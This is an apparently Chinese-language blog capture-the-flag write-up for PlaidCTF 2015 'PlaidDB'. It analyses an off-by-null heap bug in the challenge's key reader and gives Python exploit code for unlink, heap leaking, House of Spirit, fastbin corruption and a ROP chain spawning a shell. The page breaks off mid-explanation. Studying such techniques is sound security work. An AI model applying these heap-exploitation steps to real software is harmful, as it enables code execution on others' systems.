@@ -1,0 +1,1396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="Software Security Researcher">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>2015-PlaidCTF-PlaidDB - B3ale</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Sunday, April 12th 2020, 4:11 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    5.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      28 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。</p>
+<a id="more"></a>
+<h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>程序保护全开：</p>
+<pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB checksec ./datastore
+[*] &#39;/home/b3ale/Heap-Exploitation/Plaid-CTF-2015-PlaidDB/datastore&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre>
+<p>尝试运行一下程序，大概是模拟了一个数据库，总共有 5 个功能，分别是 GET、PUT、DUMP、DEL 和 EXIT。PUT 用来新增列，读入数据内容时会把换行符（<code>&quot;\n&quot;</code>）也读进来；GET 用来获取对应列的信息；DUMP 获取所有被存入的列；DEL 删除列；EXIT 退出程序：</p>
+<pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ./datastore
+INFO: Welcome to the PlaidDB data storage service.
+INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
+PROMPT: Enter command:
+PUT
+PROMPT: Enter row key:
+AAA
+PROMPT: Enter data size:
+4
+PROMPT: Enter data:
+AAAA
+INFO: Insert successful.
+PROMPT: Enter command:
+ERROR: &#39;
+&#39; is not a valid command.
+PROMPT: Enter command:
+GET
+PROMPT: Enter row key:
+AAA
+INFO: Row data [4 bytes]:
+AAAAPROMPT: Enter command:
+DUMP
+INFO: Dumping all rows.
+INFO: Row [AAA], 4 bytes
+INFO: Row [th3fl4g], 8 bytes
+PROMPT: Enter command:
+DEL
+PROMPT: Enter row key:
+th3fl4g
+INFO: Delete successful.
+PROMPT: Enter command:
+DUMP
+INFO: Dumping all rows.
+INFO: Row [AAA], 4 bytes
+PROMPT: Enter command:
+EXIT
+INFO: Goodbye
+</code></pre>
+<p>先用 IDA 来大概看看函数的大概实现。大体就是菜单题的样子，然后大概是用红黑树对数据进行存储，所以我站在前人的肩膀上把结构体改好了：</p>
+<pre><code class="cpp">struct Node {
+    char *key;
+    long data_size;
+    char *data;
+    struct Node *left;
+    struct Node *right;
+    long dummy;
+    long dummy1;
+}
+</code></pre>
+<p>其中 get 函数一开始获取输入的列名（这里我已经标出了 <code>vulread()</code>，在后面会再提到），然后遍历红黑树节点，对读入的 key 和指定节点上的 key 进行比较，如果相等的话会输出相应的 data。最后会把 key 的缓存给 free 掉：</p>
+<pre><code class="cpp">void get()
+{
+  char *key; // rbp
+  struct Node *node; // rbx
+  int cmp_result; // eax
+
+  puts(&quot;PROMPT: Enter row key:&quot;);
+  key = vulread();
+  node = root;
+LABEL_2:
+  if ( node )
+  {
+    while ( 1 )
+    {
+      cmp_result = strcmp(key, node-&gt;key);
+      if ( cmp_result &lt; 0 )
+      {
+        node = node-&gt;left;
+        goto LABEL_2;
+      }
+      if ( !cmp_result )
+        break;
+      node = node-&gt;right;
+      if ( !node )
+        goto LABEL_6;
+    }
+    __printf_chk(1LL, &quot;INFO: Row data [%zd byte%s]:\n&quot;, node-&gt;data_size);
+    fwrite(node-&gt;data, 1uLL, node-&gt;data_size, stdout);
+    free(key);
+  }
+  else
+  {
+LABEL_6:
+    puts(&quot;ERROR: Row not found.&quot;);
+    free(key);
+  }
+}
+</code></pre>
+<p>在 put 函数中，先读入一个 key，然后读入（saferead 中调用 fgets）数据的长度，然后读入指定长度的字符串（readn 用 read 实现）。最后把读入的结构体添加到红黑树中，在 insert_node 中判断节点是否出现过，若出现过就会 free 掉当前的节点，并更新旧的节点；若没有，则插入红黑树：</p>
+<pre><code class="cpp">void put()
+{
+  void **chunk; // rbx
+  unsigned __int64 size; // rax
+  void *buf; // rax
+  struct Node *v3; // rbp
+  char size_1[24]; // [rsp+0h] [rbp-38h]
+  unsigned __int64 canary; // [rsp+18h] [rbp-20h]
+
+  canary = __readfsqword(0x28u);
+  chunk = (void **)malloc(0x38uLL);
+  if ( !chunk )
+    goto LABEL_10;
+  puts(&quot;PROMPT: Enter row key:&quot;);
+  *chunk = vulread();
+  puts(&quot;PROMPT: Enter data size:&quot;);
+  saferead(size_1, 16LL);
+  size = strtoul(size_1, 0LL, 0);
+  chunk[1] = (void *)size;
+  buf = malloc(size);
+  chunk[2] = buf;
+  if ( !buf )
+  {
+    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);
+    free(*chunk);
+    if ( __readfsqword(0x28u) == canary )
+    {
+      free(chunk);
+      return;
+    }
+LABEL_10:
+    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);
+    exit(-1);
+  }
+  puts(&quot;PROMPT: Enter data:&quot;);
+  readn(chunk[2], (size_t)chunk[1]);
+  v3 = (struct Node *)insert_node(chunk);
+  if ( v3 )
+  {
+    free(*chunk);
+    free(v3-&gt;data);
+    v3-&gt;data_size = (__int64)chunk[1];
+    v3-&gt;data = (char *)chunk[2];
+    free(chunk);
+    puts(&quot;INFO: Update successful.&quot;);
+  }
+  else
+  {
+    puts(&quot;INFO: Insert successful.&quot;);
+  }
+  if ( __readfsqword(0x28u) != canary )
+    goto LABEL_10;
+}
+</code></pre>
+<p>dump 函数后序遍历红黑树并输出列名和数据长度：</p>
+<pre><code class="cpp">struct Node *dump()
+{
+  struct Node *result; // rax
+  struct Node *node; // rbx
+  struct Node *n; // rax
+
+  puts(&quot;INFO: Dumping all rows.&quot;);
+  result = (struct Node *)&amp;root;
+  node = root;
+  if ( !root )
+    return result;
+  while ( node-&gt;left )
+    node = node-&gt;left;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      node-&gt;data_size;
+      __printf_chk(1LL, &quot;INFO: Row [%s], %zd byte%s\n&quot;, node-&gt;key);
+      n = node-&gt;right;
+      if ( !n )
+        break;
+      do
+      {
+        node = n;
+        n = n-&gt;left;
+      }
+      while ( n );
+    }
+    result = node-&gt;dummy;
+    if ( !result || node != result-&gt;left )
+      break;
+LABEL_15:
+    node = result;
+  }
+  while ( result )
+  {
+    if ( node != result-&gt;right )
+      goto LABEL_15;
+    node = result;
+    result = result-&gt;dummy;
+  }
+  return result;
+}
+</code></pre>
+<p>最后的 del 函数比较复杂，就不放太多代码了，因为主要操作是从红黑树中删除节点，最后会依次 free 掉节点的 key、节点的 data、节点本身以及输入的 key。不过如果没有找到指定的列，就不会把输入的 key 给 free 掉：</p>
+<pre><code class="cpp">int del()
+{
+  puts(&quot;PROMPT: Enter row key:&quot;);
+  key = vulread();
+  node = root;
+LABEL_2:
+  if ( !node )
+  {
+LABEL_6:
+    puts(&quot;ERROR: Row not found.&quot;);
+    return;
+  }
+  while ( 1 )
+  {
+    key_1 = node-&gt;key;
+  ...
+LABEL_69:
+  LODWORD(n-&gt;dummy1) = 0;
+LABEL_29:
+  free(key_1);
+  free(node-&gt;data);
+  free(node);
+  free(key);
+  return puts(&quot;INFO: Delete successful.&quot;);
+}
+</code></pre>
+<p>最后来看 vulread 这里，逐字节读取字符，判断如果读到换行符就 break。如果读入的长度大于 24，则会用 realloc 扩展一倍 chunk 的大小。读完指定长度之后会在字符串最后补上 <code>&quot;\x00&quot;</code>：</p>
+<pre><code class="cpp">char *vulread()
+{
+  char *buf; // r12
+  char *end; // rbx
+  size_t cap; // r14
+  char c; // al
+  char c_1; // bp
+  signed __int64 idx; // r13
+  char *new_buf; // rax
+
+  buf = (char *)malloc(8uLL);
+  end = buf;
+  cap = malloc_usable_size(buf);                // 24
+  while ( 1 )
+  {
+    c = _IO_getc(stdin);
+    c_1 = c;
+    if ( c == -1 )
+      goodbye();
+    if ( c == &#39;\n&#39; )
+      break;
+    idx = end - buf;
+    if ( cap &lt;= end - buf )
+    {
+      new_buf = (char *)realloc(buf, 2 * cap);
+      buf = new_buf;
+      if ( !new_buf )
+      {
+        puts(&quot;FATAL: Out of memory&quot;);
+        exit(-1);
+      }
+      end = &amp;new_buf[idx];
+      cap = malloc_usable_size(new_buf);        // 48
+    }
+    *end++ = c_1;
+  }
+  *end = 0;                                   // off by one
+  return buf;
+}
+</code></pre>
+<p>再用 ltrace 跟一下，大概地看看发生了哪些 malloc 和 free：</p>
+<pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastore
+datastore-&gt;malloc(56)                                                   = 0x564b295ad010
+datastore-&gt;malloc(8)                                                    = 0x564b295ad050
+datastore-&gt;malloc(9)                                                    = 0x564b295ad070
+INFO: Welcome to the PlaidDB data storage service.
+INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
+PROMPT: Enter command:
+PUT
+datastore-&gt;malloc(56)                                                   = 0x564b295ad090
+PROMPT: Enter row key:
+datastore-&gt;malloc(8)                                                    = 0x564b295ad0d0
+A
+PROMPT: Enter data size:
+0
+datastore-&gt;malloc(0)                                                    = 0x564b295ad0f0
+PROMPT: Enter data:
+INFO: Insert successful.
+PROMPT: Enter command:
+DEL
+PROMPT: Enter row key:
+datastore-&gt;malloc(8)                                                    = 0x564b295ad110
+A
+datastore-&gt;free(0x564b295ad0d0)                                         = &lt;void&gt;
+datastore-&gt;free(0x564b295ad0f0)                                         = &lt;void&gt;
+datastore-&gt;free(0x564b295ad090)                                         = &lt;void&gt;
+datastore-&gt;free(0x564b295ad110)                                         = &lt;void&gt;
+INFO: Delete successful.
+PROMPT: Enter command:
+DUMP
+INFO: Dumping all rows.
+INFO: Row [th3fl4g], 8 bytes
+PROMPT: Enter command:
+EXIT
+INFO: Goodbye
++++ exited (status 0) +++
+</code></pre>
+<h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>根据上面的分析，有用的信息大概如下几个：</p>
+<ol>
+<li>每个节点固定大小（<code>malloc(56)</code>）；</li>
+<li><code>vulread()</code> 函数中有 <code>malloc()</code> 和 <code>realloc()</code>，可以用 <code>realloc()</code> 获取特定大小的 chunk；</li>
+<li><code>vulread()</code> 里存在 Off by Null；</li>
+<li>删除节点时，如果列名不存在，key 所对应的 chunk 不会被 free；</li>
+<li>往节点中读入数据时的大小可控（<code>malloc(size)</code>）。插入节点时会进行判断，若新节点的 key 值不存在，则插入节点；若存在，则依次 free 新的 key、旧的 data、新的节点。存在节点时的 free 顺序如下：</li>
+</ol>
+<pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastore
+datastore-&gt;malloc(56)                                                   = 0x55feff2f2010
+datastore-&gt;malloc(8)                                                    = 0x55feff2f2050
+datastore-&gt;malloc(9)                                                    = 0x55feff2f2070
+INFO: Welcome to the PlaidDB data storage service.
+INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
+PROMPT: Enter command:
+PUT
+datastore-&gt;malloc(56)                                                   = 0x55feff2f2090
+PROMPT: Enter row key:
+datastore-&gt;malloc(8)                                                    = 0x55feff2f20d0
+A
+PROMPT: Enter data size:
+2
+datastore-&gt;malloc(2)                                                    = 0x55feff2f20f0
+PROMPT: Enter data:
+A
+INFO: Insert successful.
+PROMPT: Enter command:
+PUT
+datastore-&gt;malloc(56)                                                   = 0x55feff2f2110
+PROMPT: Enter row key:
+datastore-&gt;malloc(8)                                                    = 0x55feff2f2150
+A
+PROMPT: Enter data size:
+2
+datastore-&gt;malloc(2)                                                    = 0x55feff2f2170
+PROMPT: Enter data:
+B
+datastore-&gt;free(0x55feff2f2150)                                         = &lt;void&gt;
+datastore-&gt;free(0x55feff2f20f0)                                         = &lt;void&gt;
+datastore-&gt;free(0x55feff2f2110)                                         = &lt;void&gt;
+INFO: Update successful.
+PROMPT: Enter command:
+EXIT
+INFO: Goodbye
++++ exited (status 0) +++
+</code></pre>
+<p>看过一遍后，漏洞点其实就在 <code>vulread()</code> 中。如果正好读满 24 字节，然后跟上换行，还会在最后面跟上一个 <code>&quot;\x00&quot;</code>，造成 Off by One（Off by Null）。不过找漏洞还有一种方法。本身程序这里红黑树的操作比较复杂，如果在不知道的情况下单纯地去逆会很难。所以可以对程序进行 Fuzz 来定位漏洞。用 AFL Fuzz 后可以得到会让程序 Crash 的 Payload：</p>
+<pre><code>PUT
+A
+0
+DEL
+A
+PUT
+NNNNNN
+0
+PUT
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre><p>可以看到在 free 的时候提示了 <code>&quot;free(): invalid next size (fast)&quot;</code>，再经过一系列的调试就能判断出应该是溢出的 Null 字节盖到了下一个 chunk 的 size：</p>
+<pre><code>➜  Plaid-CTF-2015-PlaidDB (cat crash.txt ; cat) | ./datastore
+INFO: Welcome to the PlaidDB data storage service.
+INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
+PROMPT: Enter command:
+PROMPT: Enter row key:
+PROMPT: Enter data size:
+PROMPT: Enter data:
+INFO: Insert successful.
+PROMPT: Enter command:
+PROMPT: Enter row key:
+INFO: Delete successful.
+PROMPT: Enter command:
+PROMPT: Enter row key:
+PROMPT: Enter data size:
+GET
+PROMPT: Enter data:
+INFO: Insert successful.
+PROMPT: Enter command:
+GET
+PROMPT: Enter row key:
+AAAAAAAAAAAAAAAAAAAAAAAA
+ERROR: Row not found.
+cat: -: Resource temporarily unavailable
+*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x00005555557580d0 ***
+</code></pre><p>这里的 Off by Null 可以溢出盖到下一个 chunk 的 size 的最低一个字节，使得该 chunk 的 <strong>size 变小</strong>（shrink），同时也把 <strong>prev_inuse 置为 0</strong>；同时可以<strong>设置下一个 chunk 的 prev_size</strong>，然后就可以 unlink 拿到某个指针了。画了个草图，这里通过 chunk2 溢出修改 chunk3 的 prev_size 以及覆盖 size 的最低字节为 Null，将 chunk3 的 prev_inuse 置零的同时 shrink：</p>
+<pre><code>                                    prev                            prev
+             size                   size     size                   size     size
+ +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+
+ |        |   XX   |chunk1(freed)|   XX   |   XX |0|    chunk2   |   XX   |  XX+1|1|    chunk3   |
+ +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+
+   prev
+   size     size
+ +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+
+ |        |        |             |        |        |AAAAAAAAAAAAA|  2*XX  |   YY |0|        |    |
+ +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+
+</code></pre><p>实现这样的构造之后，可以通过 GET 把 unlink 后的得到的 chunk 覆盖到的节点信息泄漏出来。然后可以把这个 chunk 作为 value，可以读入任意的数据，构造一些指针作为节点的结构体成员，用 GET 就可以任意读，用 PUT 可以任意写。</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>下面大概记录一下怎么构造出 unlink。首先利用几个 PUT 对堆进行初步的布局：</p>
+<pre><code class="python"># Off by Null + Unlink
+PUT(&#39;3&#39;, &#39;&#39;)
+PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlink
+PUT(&#39;1&#39;, &#39;&#39;) # chunk for overflow
+PUT(&#39;2&#39;, &#39;&#39;)
+PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)
+</code></pre>
+<p>结果大概如下，列 <code>&#39;1&#39;</code> 对应的部分会在最后一次 PUT 的时候被替换掉内容，会依次 free 掉 0x3a0、0x2c0、0x360 处的 chunk：</p>
+<pre><code> +------------+ 0x0f0 - 0x10
+ |    0x40    | node &#39;3&#39;
+ +------------+ 0x130 - 0x10
+ |    0x20    | &#39;3&#39;
+ +------------+ 0x150 - 0x10
+ |    0x20    | &#39;&#39;
+ +------------+ 0x170 - 0x10
+ |    0x40    | node &#39;0&#39;
+ +------------+ 0x1b0 - 0x10
+ |    0x20    | &#39;0&#39;
+ +------------+ 0x1d0 - 0x10
+ |    0x90    | &#39;C&#39; * 0x80
+ +------------+ 0x260 - 0x10
+ |    0x40    | node &#39;1&#39;
+ +------------+ 0x2a0 - 0x10
+ |    0x20    | &#39;1&#39;
+ +------------+ 0x2c0 - 0x10
+ |    0x20    | &#39;&#39; =&gt; [freed]
+ +------------+ 0x2e0 - 0x10
+ |    0x40    | node &#39;2&#39;
+ +------------+ 0x320 - 0x10
+ |    0x20    | &#39;2&#39;
+ +------------+ 0x340 - 0x10
+ |    0x20    | &#39;&#39;
+ +------------+ 0x360 - 0x10
+ |    0x40    | node &#39;1&#39; =&gt; [freed]
+ +------------+ 0x3a0 - 0x10
+ |    0x20    | &#39;1&#39; =&gt; [freed]
+ +------------+ 0x3c0 - 0x10
+ |   0x100    | &#39;A&#39; * 0xf8
+ +------------+
+</code></pre><p>接下来 PUT 列 <code>&#39;2&#39;</code> 中的内容，用于之后的 unlink，同时伪造了一个 fastbin chunk，之后避免之后 shrink+free 后和 top chunk 合并：</p>
+<pre><code class="python">PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbin
+</code></pre>
+<p>堆内存大概如下，此时有两个 0x20 的 fastbin 和一个 0x40 的 fastbin：</p>
+<pre><code> +------------+ 0x0f0 - 0x10
+ |    0x40    | node &#39;3&#39;
+ +------------+ 0x130 - 0x10
+ |    0x20    | &#39;3&#39;
+ +------------+ 0x150 - 0x10
+ |    0x20    | &#39;&#39;
+ +------------+ 0x170 - 0x10
+ |    0x40    | node &#39;0&#39;
+ +------------+ 0x1b0 - 0x10
+ |    0x20    | &#39;0&#39;
+ +------------+ 0x1d0 - 0x10
+ |    0x90    | &#39;C&#39; * 0x80
+ +------------+ 0x260 - 0x10
+ |    0x40    | node &#39;1&#39;
+ +------------+ 0x2a0 - 0x10
+ |    0x20    | &#39;1&#39;
+ +------------+ 0x2c0 - 0x10
+ |    0x20    | &#39;2&#39; -&gt; [freed]
+ +------------+ 0x2e0 - 0x10
+ |    0x40    | node &#39;2&#39;
+ +------------+ 0x320 - 0x10
+ |    0x20    | &#39;2&#39;
+ +------------+ 0x340 - 0x10
+ |    0x20    | &#39;&#39; =&gt; [freed]
+ +------------+ 0x360 - 0x10
+ |    0x40    | node &#39;2&#39; =&gt; [freed]
+ +------------+ 0x3a0 - 0x10
+ |    0x20    | [freed]
+ +------------+ 0x3c0 - 0x10
+ |   0x100    | &#39;A&#39; * 0xf8
+ +------------+ 0x4c0 - 0x10
+ |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18
+ +------------+
+</code></pre><p>然后接下来触发 Off-by-Null，并且：</p>
+<pre><code class="python">DEL(&#39;1&#39;)
+DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size=752
+DEL(&#39;0&#39;)
+DEL(&#39;2&#39;) # unlink
+</code></pre>
+<p>smallbin 里会产生一块很大的 chunk，接下来就能 overlap 其中的 chunk，进行任意读、任意写：</p>
+<pre><code> +------------+ 0x0f0 - 0x10                                    +------------+
+ |    0x40    | node &#39;3&#39;                                        |    0x40    |
+ +------------+ 0x130 - 0x10                                    +------------+
+ |    0x20    | &#39;3&#39;                                             |    0x20    |
+ +------------+ 0x150 - 0x10                                    +------------+
+ |    0x20    | &#39;&#39;                                              |    0x20    |
+ +------------+ 0x170 - 0x10                                    +------------+
+ |    0x40    | node &#39;0&#39; =&gt; [freed]                             |    0x40    |
+ +------------+ 0x1b0 - 0x10                                    +------------+
+ |    0x20    | &#39;0&#39; =&gt; [freed]                                  |    0x20    |
+ +------------+ 0x1d0 - 0x10                       0x1d0 - 0x10 +------------+
+ |    0x90    | &#39;C&#39; * 0x80 =&gt; [freed]                           |   0x3f0    |
+ +------------+ 0x260 - 0x10                                    +---- :: ----+
+ |    0x40    | node &#39;1&#39; =&gt; [freed]                             |     ::     |
+ +------------+ 0x2a0 - 0x10                                    +---- :: ----+
+ |    0x20    | &#39;1&#39; =&gt; [freed]                                  |     ::     |
+ +------------+ 0x2c0 - 0x10                                    +---- :: ----+
+ |    0x20    | [freed]                                         |     ::     |
+ +------------+ 0x2e0 - 0x10                                    +---- :: ----+
+ |    0x40    | node &#39;2&#39; =&gt; [freed]                             |     ::     |
+ +------------+ 0x320 - 0x10                                    +---- :: ----+
+ |    0x20    | &#39;2&#39; =&gt; [freed]                                  |     ::     |
+ +------------+ 0x340 - 0x10                                    +---- :: ----+
+ |    0x20    | [freed]                                         |     ::     |
+ +------------+ 0x360 - 0x10                                    +---- :: ----+
+ |    0x40    | [freed]                                         |     ::     |
+ +------------+ 0x3a0 - 0x10                                    +---- :: ----+
+ |    0x20    | [freed]                                         |     ::     |
+ +------------+ 0x3c0 - 0x10                       0x3c0 - 0x10 +---- :: ----+
+ |   0x100    | &#39;X&#39; * 0xf8                           &#39;X&#39; * 0xf8 |     ::     |
+ +------------+ 0x4c0 - 0x10                                    +---- :: ----+
+ |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 =&gt; [freed]  |     ::     |
+ +------------+                                    0x5c0 - 0x10 +------------+
+                                                     &#39;C&#39; * 0x18 |    0x20    |
+                                                                +------------+
+</code></pre><p>利用 PUT 泄漏出 heap，并且能构造一个泄漏函数：</p>
+<pre><code class="python"># Leak Heap Address
+DEL(&#39;3&#39;) # put a previous node chunk into fastbin
+PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +
+    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +
+    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +
+    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;)
+)
+PUT(&#39;LEAKBUF&#39;, &#39;&#39;)
+data = GET(&#39;KEY1&#39;)
+heap_base = u64(data[0x110:0x118]) - 0x150
+info(&#39;heap_base = &#39; + hex(heap_base))
+
+# Function for Leaking Memory
+def leak(addr, size):
+    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)
+    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])
+    return GET(&#39;LEAKBUF&#39;)
+</code></pre>
+<p>LEAKBUF 在内存中的布局如下，LEAKBUF 的结构体中的 data 和 data_size 可以被 overlap，再用 PUT 泄漏：</p>
+<pre><code> +------------+ 0x0f0 - 0x10
+ |    0x40    | node &#39;3&#39; =&gt; [freed] =&gt; node &#39;KEY1&#39;
+ +------------+ 0x130 - 0x10
+ |    0x20    | &#39;3&#39; =&gt; [freed] =&gt; &#39;&#39;
+ +------------+ 0x150 - 0x10
+ |    0x20    | &#39;&#39; =&gt; [freed] =&gt; &#39;LEAKBUF&#39;
+ +------------+ 0x170 - 0x10
+ |    0x40    | [freed]
+ +------------+ 0x1b0 - 0x10
+ |    0x20    | [freed]
+ +------------+ 0x1d0 - 0x10
+ |   0x3f0    | [freed] =&gt; chunk
+ +---- :: ----+ 0x260 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x2a0 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x2c0 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x2e0 - 0x10
+ |   [0x40]   | [freed] =&gt; node &#39;LEAKBUF&#39;
+ +---- :: ----+ 0x320 - 0x10
+ |   [0x20]   | [freed]
+ +---- :: ----+ 0x340 - 0x10
+ |   [0x20]   | [freed] =&gt; &#39;KEY1&#39;
+ +---- :: ----+ 0x360 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x3a0 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x3c0 - 0x10
+ |     ::     | &#39;X&#39; * 0xf8
+ +---- :: ----+ 0x4c0 - 0x10
+ |     ::     | [freed]
+ +------------+ 0x5c0 - 0x10
+ |    0x20    | &#39;C&#39; * 0x18
+ +------------+
+</code></pre><p>接下来构造一个假的 fastbin chunk 来进行 House-of-Spirit，然后改掉它的 fd 指针：</p>
+<pre><code class="python"># House of Spirit + Fastbin Corruption + ROP
+PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)
+PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +
+    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;
+    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
+    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358
+    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8
+    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;)
+)
+DEL(&#39;P&#39;) # house of spirit
+DEL(&#39;KEY1&#39;)
+PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +
+    p64(0x40) + p64(heap_base + 0x3e0) +
+    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
+    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +
+    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8
+    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420
+    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets
+) # fastbin corruption
+</code></pre>
+<p>最后这里堆布局比较复杂，大概就是伪造一个 fastbin 然后再改它的指针，后面就能取到指针对应的 fake chunk：</p>
